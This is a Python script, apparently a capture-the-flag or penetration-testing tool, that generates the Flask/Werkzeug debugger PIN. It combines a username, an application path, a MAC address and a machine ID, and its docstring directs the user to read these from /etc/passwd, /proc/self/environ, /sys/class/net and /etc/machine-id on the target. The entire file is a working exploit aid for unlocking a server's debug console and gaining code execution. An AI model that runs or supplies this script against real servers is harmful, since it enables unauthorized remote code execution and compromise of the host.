import sys
from hashlib import md5 as _md5
from itertools import chain

def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: str, modName: str = "flask.app",
                  appName: str = "Flask") -> str:
    """get flask debug pin code.
    Args:
        username (str): username of flask, try get it from /etc/passwd or /proc/self/environ
        absRootPath (str): project abs root path,from getattr(mod, '__file__', None)
        macAddress (str): mac address,from /sys/class/net/<eth0>/address
        machineId (str): machine id,from /proc/self/cgroup first line with string behind /docker/ or /etc/machine-id or /proc/sys/kernel/random/boot_id
        modName (str, optional): mod name.  Defaults to "flask.app".
        appName (str, optional): app name, from getattr(app, '__name__', getattr(app.__class__, '__name__')). Defaults to "Flask".
    Returns:
        str: flask debug pin code
    """
    rv, num = None, None
    probably_public_bits = [
        username,
        modName,
        # getattr(app, '__name__', getattr(app.__class__, '__name__'))
        appName,
        # getattr(mod, '__file__', None),
        absRootPath,
    ]

    private_bits = [
        # str(uuid.getnode()),  /sys/class/net/ens33/address
        str(int(macAddress.strip().replace(":", ""), 16)),
        machineId,  # get_machine_id(), /etc/machine-id
    ]

    h = _md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num
    return rv

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Incorrect arguments")
        sys.exit(1)
    username = sys.argv[1]
    root_path = sys.argv[2]
    mac = sys.argv[3]
    machine_id = sys.argv[4]

    print(f"[+] Generating PIN...")
    print(f"\tUser: {username}\n\tPath: {root_path}\n\tMAC: {mac}\n\tID: {machine_id}")

    rv = get_flask_pin(username, root_path, mac, machine_id)

    print(f"[+] PIN: {rv}")
